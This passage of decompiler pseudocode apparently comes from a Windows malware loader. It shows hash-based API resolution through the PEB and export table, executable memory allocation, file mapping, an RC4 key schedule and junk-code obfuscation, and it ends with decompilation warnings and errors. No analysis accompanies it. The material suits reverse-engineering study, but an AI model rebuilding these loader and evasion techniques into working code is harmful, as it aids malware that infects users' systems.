  if ( v30 )
  {
    dword_43FB8C = v30;
    dword_43E030 -= 30664;
    dword_43E008 += 12987;
    v43 = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_4095A7((int)v30, v49, 976580703);
    if ( v43 )
    {
      LOBYTE(dword_43E04C) = dword_43E04C + 16;
      dword_43FB55 = v43;
      v16 = dword_43F4C4;
      dword_43E01C += 16453;
      dword_43E04C += dword_43F060;
      v17 = dword_43ECD0 + 25567;
      dword_43E02C -= 30117;
      LOBYTE(dword_43E034) = -56;
      v29 = dword_43FB8C(dword_43ECD0 + 25567, 0, 0x2000, 12288, 64);
      if ( v29 )
      {
        dword_43FC0E = v29;
        dword_43E01C += 20312;
        v21 = 22159;
        LOBYTE(dword_43E030) = 105;
        LOBYTE(v21) = byte_43F7F4;
        dword_43E004 = v16 - 1;
        v32 = dword_43FC1E(
                (char *)&MapViewOfFile + (((dword_43F45C + v17 + 1) | 0x393Bu) < dword_43F904) + 14657,
                v21,
                &unk_43FA56,
                -1073741824,
                1,
                0,
                3,
                0,
                0);
        LOBYTE(dword_43E028) = -6;
        LOBYTE(dword_43E00C) = dword_43E00C + 123;
        dword_43E02C = v3;
        dword_43E010 += 7013;
        v18 = dword_43F448 - 1;
        dword_43FA26(v32, dword_43FC0E, 0x2000, &unk_421119, 0, v32);
        v28 = __CFADD__(byte_43EDF8, v8);
        LOBYTE(v9) = byte_43EDF8 + v8;
        v10 = v28 + v18 - 103;
        dword_43FB9C(v9, v11);
        v12 = 25629;
        LOBYTE(v12) = v10;
        dword_43FC12(dword_43F418, v12, &unk_43FA56);
        v15 = 0x2000;
        dword_43E02C += 21751;
        v23 = (_BYTE *)dword_43FC0E;
        v24 = 0;
        LOBYTE(dword_43E008) = -58;
        dword_43E038 = 27150;
        v20 = 0;
        do
        {
          LOBYTE(v20) = *v23++;
          v24 += v20;
          dword_43E03C += v15 + 7733;
          v20 = 0;
          --v15;
        }
        while ( v15 );
        dword_43FBA4 = v24;
        v28 = __CFADD__(dword_43F634 != 0, v23) | __CFADD__(&v23[dword_43F634 != 0], 3457);
        v2 = dword_43E10C;
        dword_43FB55(11954, v28 + dword_43F6B0 + 9296, dword_43FC0E, 0, 0x8000);
        dword_43E014 -= v2;
        dword_43E030 = 20326;
        v39 = v38 + 17631;
        v40 = 0x2000;
        LOBYTE(dword_43E020) = dword_43E020 + 102;
        v41 = &unk_421219;
        v42 = dword_43F1C0;
        while ( 1 )
        {
          v39 ^= 0x3C2Cu;
          v28 = v42 < dword_43F66C;
          v42 -= dword_43F66C;
          *v41++ = 0;
          v2 += v28 + 19989;
          if ( !--v40 )
            JUMPOUT(0x407EA0);
        }
      }
    }
  }
  JUMPOUT(0x407F74);
}
// 407E9A: control flows out of bounds to 407EA0
// 407F31: control flows out of bounds to 407F74
// 408875: conditional instruction was optimized away because of '%0x18.4==1'
// 408CEE: variable 'v38' is possibly undefined
// 409203: variable 'v49' is possibly undefined
// 406FF9: variable 'v3' is possibly undefined
// 4071D5: variable 'v8' is possibly undefined
// 4071E6: variable 'v9' is possibly undefined
// 4071E6: variable 'v11' is possibly undefined
// 408AE9: variable 'v31' is possibly undefined
// 409276: variable 'v44' is possibly undefined
// 40928A: variable 'v45' is possibly undefined
// 4092B9: variable 'v28' is possibly undefined
// 40706D: variable 'v5' is possibly undefined
// 40728B: variable 'v6' is possibly undefined
// 43E004: using guessed type int dword_43E004;
// 43E008: using guessed type int dword_43E008;
// 43E00C: using guessed type int dword_43E00C;
// 43E010: using guessed type int dword_43E010;
// 43E014: using guessed type int dword_43E014;
// 43E018: using guessed type int dword_43E018;
// 43E01C: using guessed type int dword_43E01C;
// 43E020: using guessed type int dword_43E020;
// 43E024: using guessed type int dword_43E024;
// 43E028: using guessed type int dword_43E028;
// 43E02C: using guessed type int dword_43E02C;
// 43E030: using guessed type int dword_43E030;
// 43E034: using guessed type int dword_43E034;
// 43E038: using guessed type int dword_43E038;
// 43E03C: using guessed type int dword_43E03C;
// 43E040: using guessed type int dword_43E040;
// 43E044: using guessed type int dword_43E044;
// 43E048: using guessed type int dword_43E048;
// 43E04C: using guessed type int dword_43E04C;
// 43E10C: using guessed type int dword_43E10C;
// 43E160: using guessed type int dword_43E160;
// 43E164: using guessed type int dword_43E164;
// 43E2A8: using guessed type int dword_43E2A8;
// 43E47C: using guessed type int dword_43E47C;
// 43E4B4: using guessed type int dword_43E4B4;
// 43E528: using guessed type char byte_43E528;
// 43EB30: using guessed type char byte_43EB30;
// 43EC24: using guessed type char byte_43EC24;
// 43EC28: using guessed type int dword_43EC28;
// 43ECD0: using guessed type int dword_43ECD0;
// 43ED94: using guessed type int dword_43ED94;
// 43EDF8: using guessed type char byte_43EDF8;
// 43EE84: using guessed type char byte_43EE84;
// 43EF48: using guessed type int dword_43EF48;
// 43F060: using guessed type int dword_43F060;
// 43F1C0: using guessed type int dword_43F1C0;
// 43F418: using guessed type int dword_43F418;
// 43F448: using guessed type int dword_43F448;
// 43F45C: using guessed type int dword_43F45C;
// 43F4C4: using guessed type int dword_43F4C4;
// 43F634: using guessed type int dword_43F634;
// 43F66C: using guessed type int dword_43F66C;
// 43F6B0: using guessed type int dword_43F6B0;
// 43F7F4: using guessed type char byte_43F7F4;
// 43F904: using guessed type int dword_43F904;
// 43FA26: using guessed type int (__stdcall *dword_43FA26)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43FA32: using guessed type int (__fastcall *dword_43FA32)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43FB55: using guessed type int (__fastcall *dword_43FB55)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43FB8C: using guessed type int (__thiscall *dword_43FB8C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43FB9C: using guessed type int (__fastcall *dword_43FB9C)(_DWORD, _DWORD);
// 43FBA4: using guessed type int dword_43FBA4;
// 43FBC4: using guessed type int (__fastcall *dword_43FBC4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43FC0E: using guessed type int dword_43FC0E;
// 43FC12: using guessed type int (__fastcall *dword_43FC12)(_DWORD, _DWORD, _DWORD);
// 43FC1E: using guessed type int (__fastcall *dword_43FC1E)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43FC42: using guessed type int (__stdcall *dword_43FC42)(_DWORD, _DWORD);

//----- (00408832) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_408832@<eax>(_DWORD *a1@<ebp>)
{
  char v1; // cl
  unsigned __int8 v2; // bl
  _BYTE *v3; // edx
  _BYTE *v4; // edi
  unsigned int v5; // esi
  _BYTE *v6; // eax
  int v7; // eax
  int result; // eax
  unsigned int i; // esi

  v3 = (_BYTE *)a1[4];
  v4 = v3;
  v5 = 0;
  v6 = v3;
  do
  {
    v1 = v5++;
    *v6++ = v1;
  }
  while ( v5 < 0x100 );
  v3[256] = 0;
  v3[257] = 0;
  *((_BYTE *)a1 - 1) = 0;
  v2 = 0;
  *(a1 - 2) = v3;
  for ( i = 0; i < 0x100; ++i )
  {
    v7 = (v2 + *(unsigned __int8 *)*(a1 - 2) + *(unsigned __int8 *)(a1[2] + *((unsigned __int8 *)a1 - 1))) % 256;
    v2 = (v2 + *(unsigned __int8 *)*(a1 - 2) + *(unsigned __int8 *)(a1[2] + *((unsigned __int8 *)a1 - 1))) % 256;
    sub_408EE3(&v4[i], &v4[(unsigned __int8)v7]);
    result = (*((unsigned __int8 *)a1 - 1) + 1) / a1[3];
    *((_BYTE *)a1 - 1) = (*((unsigned __int8 *)a1 - 1) + 1) % a1[3];
    ++*(a1 - 2);
  }
  return result;
}
// 407272: positive sp value 4 has been found

//----- (00408EE3) --------------------------------------------------------
_BYTE *__cdecl sub_408EE3(_BYTE *a1, _BYTE *a2)
{
  _BYTE *result; // eax
  char v3; // cl

  result = a1;
  v3 = *a1;
  *a1 = *a2;
  *a2 = v3;
  return result;
}

//----- (004090C4) --------------------------------------------------------
char sub_4090C4()
{
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  return sub_407529(&savedregs);
}

//----- (00409142) --------------------------------------------------------
void __usercall sub_409142(unsigned int a1@<ecx>, void *a2@<edi>, const void *a3@<esi>)
{
  qmemcpy(a2, a3, a1);
}

//----- (00409469) --------------------------------------------------------
void __usercall sub_409469(int a1@<eax>, int a2@<ecx>)
{
  int v2; // ecx
  __int64 v3; // rdi
  unsigned int v4; // eax
  int v5; // ebx
  int v6; // edx

  dword_43E020 -= a2;
  dword_43E048 = a1;
  dword_43E028 = a1;
  v6 = *((_DWORD *)NtCurrentPeb()->ImageBaseAddress + 5);
  dword_43E008 -= a1;
  HIDWORD(v3) = *(_DWORD *)(v6 + 40);
  v2 = 24;
  LODWORD(v3) = 0;
  dword_43E02C = 21673;
  while ( 1 )
  {
    v4 = (unsigned __int8)*(_BYTE *)HIDWORD(v3);
    ++HIDWORD(v3);
    if ( (char)v4 >= 97 )
      LOBYTE(v4) = v4 - 32;
    LODWORD(v3) = __ROR4__(v3, 13);
    v5 = ((v4 | 0x462700000000ui64) + v3) >> 32;
    LODWORD(v3) = v4 + v3;
    LOBYTE(dword_43E014) = -66;
    dword_43E020 = v5;
    if ( !--v2 )
    {
      dword_43E024 = HIDWORD(v3) - 1;
      dword_43E034 = 25595;
      JUMPOUT(0x407F11);
    }
  }
}
// 407BAC: control flows out of bounds to 407F11
// 43E008: using guessed type int dword_43E008;
// 43E014: using guessed type int dword_43E014;
// 43E020: using guessed type int dword_43E020;
// 43E024: using guessed type int dword_43E024;
// 43E028: using guessed type int dword_43E028;
// 43E02C: using guessed type int dword_43E02C;
// 43E034: using guessed type int dword_43E034;
// 43E048: using guessed type int dword_43E048;

//----- (004095A7) --------------------------------------------------------
int __usercall sub_4095A7@<eax>(int a1@<eax>, int a2@<ecx>, int a3)
{
  unsigned int i; // esi
  int v4; // eax
  int v5; // ebx
  int v6; // eax
  _DWORD *v8; // edi
  unsigned __int16 *v9; // [esp+10h] [ebp-Ch]
  _DWORD *v10; // [esp+14h] [ebp-8h]
  int v11; // [esp+18h] [ebp-4h]

  sub_409469(a1, a2);
  v5 = v4;
  v6 = v4 + *(_DWORD *)(v4 + 60) + 24;
  v8 = (_DWORD *)(v5 + *(_DWORD *)(v6 + 96));
  if ( HIWORD(a3) )
  {
    v10 = (_DWORD *)(v5 + v8[8]);
    v9 = (unsigned __int16 *)(v5 + v8[9]);
    for ( i = 0; v8[6] > i; ++i )
    {
      if ( sub_408299((_BYTE *)(v5 + *v10)) == a3 )
      {
        v11 = *v9;
        break;
      }
      ++v10;
      ++v9;
    }
    if ( v8[6] == i )
      return 0;
  }
  else
  {
    v11 = (unsigned __int16)a3 - v8[4];
  }
  return v5 + *(_DWORD *)(v5 + v8[7] + 4 * v11);
}
// 407928: variable 'v4' is possibly undefined
// 4089FF: variable 'v11' is possibly undefined

// nfuncs=48 queued=48 decompiled=48 lumina nreq=0 worse=0 better=0
#error "There were 2 decompilation failure(s) on 48 function(s)"
